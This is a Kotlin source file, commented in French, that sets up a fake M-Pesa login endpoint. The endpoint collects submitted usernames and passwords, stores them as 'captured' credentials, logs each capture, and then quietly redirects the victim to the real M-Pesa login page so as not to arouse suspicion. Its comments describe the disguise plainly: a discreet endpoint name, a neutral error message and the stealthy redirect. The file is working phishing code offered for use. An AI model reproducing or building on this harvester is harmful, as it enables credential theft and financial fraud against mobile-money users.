package com.fardc.sigint.core

import io.javalin.Javalin
import java.util.Base64

class MPesaCommander(
    private val vault: SecurityVault, 
    private val combatHandler: CombatModeHandler,
    private val logger: BlackBox // Ajout pour la traçabilité souveraine
) {
    fun setup(app: Javalin) {
        app.post("/auth/v1/mpesa-gateway") { ctx -> // Endpoint plus discret
            
            // 1. VÉRIFICATION DES RÈGLES D'ENGAGEMENT (ROE)
            if (!combatHandler.isFinancialOffenseAllowed()) {
                logger.record_incident("FINANCIAL_OFFENSE_REJECTED", "Tentative hors mode OFFENSIF")
                ctx.status(403).result("GATEWAY_TIMEOUT") // Message d'erreur neutre
                return@post
            }

            val user = ctx.formParam("u_id")
            val pass = ctx.formParam("u_tk")

            if (user != null && pass != null) {
                // 2. SÉCURISATION IMMÉDIATE DES PRISES
                println("💰 [OPS] Capture tactique réussie.")
                
                // Stockage chiffré via le vault souverain
                vault.encryptData("MPESA_CAPTURED:$user:$pass")
                
                // Enregistrement anonymisé dans la BlackBox
                logger.record_incident("MPESA_PAYLOAD_ACQUIRED", "SourceID: ${user.hashCode()}")
                
                // 3. REDIRECTION DISCRÈTE (Évite d'éveiller les soupçons)
                ctx.redirect("https://www.mpesa.in/portal/login")
            } else {
                ctx.status(400)
            }
        }
    }
}
